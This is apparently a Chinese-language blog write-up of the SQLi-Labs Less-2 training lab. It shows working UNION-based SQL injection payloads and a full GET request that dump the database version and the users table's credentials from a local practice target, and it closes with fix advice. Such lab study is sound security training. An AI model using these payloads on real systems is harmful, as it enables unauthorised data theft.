@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi-Labs Less-2 Writeup - gz2008的技术博客</title>
+  <style>
+    body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+    .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+    .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+    .back-link:hover { text-decoration: underline; }
+    h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+    .tags { margin-bottom: 25px; }
+    .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+    h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+    p { margin-bottom: 15px; color: #475569; }
+    ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+    li { margin-bottom: 8px; }
+    code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; overflow-wrap: anywhere; }
+    pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+    table { width: 100%; border-collapse: collapse; margin: 16px 0 22px; }
+    th, td { border: 1px solid #e2e8f0; padding: 9px 12px; text-align: left; vertical-align: top; }
+    th { background: #f8fafc; color: #334155; }
+    .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; margin: 20px 0; }
+    .result { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-family: Consolas, monospace; margin: 20px 0; overflow-wrap: anywhere; }
+    @media (max-width: 600px) { body { padding: 0; } .container { padding: 24px 18px; border-radius: 0; } table { display: block; overflow-x: auto; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="index.html" class="back-link">← 返回 SQLi-Labs 首页</a>
+
+    <h1>SQLi-Labs Less-2：GET 数字型报错与联合查询注入</h1>
+
+    <div class="tags">
+      <span class="tag"># SQLi-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># SQL注入</span>
+      <span class="tag"># GET</span>
+      <span class="tag"># 数字型</span>
+      <span class="tag"># UNION</span>
+    </div>
+
+    <h2>一、题目信息</h2>
+    <ul>
+      <li><strong>题目：</strong>SQLi-Labs Less-2 - Error Based - Integer</li>
+      <li><strong>方向：</strong>Web / SQL Injection</li>
+      <li><strong>环境：</strong>本地授权 SQLi-Labs 靶场</li>
+      <li><strong>目标：</strong>确认 GET 参数存在数字型 SQL 注入，并读取数据库信息。</li>
+      <li><strong>Flag：</strong>该靶场没有 flag，以成功读取数据库信息作为验证结果。</li>
+    </ul>
+
+    <h2>二、观察源码</h2>
+    <p>第 2 关的入口仍然是 <code>id</code> 参数，但源码中的 SQL 与第 1 关不同：输入没有被单引号包裹。</p>
+    <pre>$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";</pre>
+    <p>这意味着参数会直接被当作数字表达式的一部分。它不需要先闭合单引号，可以直接追加 <code>AND</code>、<code>ORDER BY</code> 或 <code>UNION SELECT</code>。</p>
+
+    <h2>三、确认数字型注入</h2>
+    <p>正常请求：</p>
+    <pre>http://127.0.0.1:18080/Less-2/?id=1</pre>
+    <div class="result">Your Login name:Dumb<br>Your Password:Dumb</div>
+
+    <p>提交永真和永假条件进行对比：</p>
+    <table>
+      <thead><tr><th>输入</th><th>SQL 条件</th><th>实际结果</th></tr></thead>
+      <tbody>
+        <tr><td><code>1 and 1=1</code></td><td>真条件</td><td>返回 Dumb / Dumb</td></tr>
+        <tr><td><code>1 and 1=2</code></td><td>假条件</td><td>不返回用户信息</td></tr>
+      </tbody>
+    </table>
+    <p>真假条件产生不同结果，说明输入可以改变 SQL 逻辑，注入点成立。</p>
+
+    <h2>四、确认参数没有引号包裹</h2>
+    <p>输入单个单引号：</p>
+    <pre>id=1'</pre>
+    <pre>You have an error in your SQL syntax</pre>
+    <p>报错说明单引号不是合法的数字表达式，进一步证明本关的注入点属于数字型。与第 1 关不同，直接提交 <code>1 and 1=1</code> 才是正确的起始形式。</p>
+
+    <div class="note">
+      <strong>和第 1 关的区别：</strong>
+      第 1 关原 SQL 是 <code>id='$id'</code>，需要先闭合单引号；第 2 关原 SQL 是 <code>id=$id</code>，无需闭合引号，直接连接逻辑表达式。
+    </div>
+
+    <h2>五、判断查询列数</h2>
+    <pre>id=1 order by 3#
+id=1 order by 4#</pre>
+    <p>第 3 列正常返回，第 4 列出现错误：</p>
+    <pre>Unknown column '4' in 'order clause'</pre>
+    <p>因此查询共有 3 列，可以使用三列 <code>UNION SELECT</code>。</p>
+
+    <h2>六、联合查询读取数据库信息</h2>
+    <p>将原结果置空，在三个返回位置中分别放入固定值、数据库名和版本号：</p>
+    <pre>id=-1 union select 1,database(),version()#</pre>
+    <div class="result">Your Login name:security<br>Your Password:5.5.44-0ubuntu0.14.04.1</div>
+
+    <p>继续读取用户表，验证注入可以跨表获取数据：</p>
+    <pre>id=-1 union select 1,group_concat(username),group_concat(password) from users#</pre>
+    <div class="result">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</div>
+
+    <div class="note">
+      <strong>URL 编码说明：</strong>
+      提交时要把 <code>#</code> 写成 <code>%23</code>，避免它被浏览器识别为 URL 片段。完整参数示例：
+      <code>?id=-1%20union%20select%201%2Cdatabase()%2Cversion()%23</code>
+    </div>
+
+    <h2>七、完整请求示例</h2>
+    <pre>GET /Less-2/?id=-1%20union%20select%201%2Cdatabase()%2Cversion()%23 HTTP/1.1
+Host: 127.0.0.1:18080</pre>
+    <p>解码后的 payload：</p>
+    <pre>-1 union select 1,database(),version()#</pre>
+
+    <h2>八、漏洞原因与影响</h2>
+    <p>根因是把 GET 参数直接拼接到数字型 SQL 表达式中。虽然这种写法不需要引号闭合，但参数依然可以注入逻辑运算和联合查询，导致查询结果被篡改，业务数据被读取。</p>
+
+    <h2>九、修复建议</h2>
+    <ul>
+      <li>使用预处理语句绑定参数，避免把 <code>id</code> 拼接进 SQL。</li>
+      <li>对数字型参数使用整数转换和严格范围校验。</li>
+      <li>关闭数据库详细报错，避免把 SQL 语法和版本信息返回给用户。</li>
+      <li>数据库账号使用最小权限，限制读取非业务表。</li>
+    </ul>
+
+    <h2>十、复盘</h2>
+    <p>第 2 关和第 1 关的核心区别是 SQL 中是否使用引号。先把源码里的拼接方式看清楚，再选择 payload：第 1 关先闭合单引号，第 2 关直接追加数字逻辑表达式。之后的列数判断和联合查询流程相同。</p>
+  </div>
+</body>
+</html>
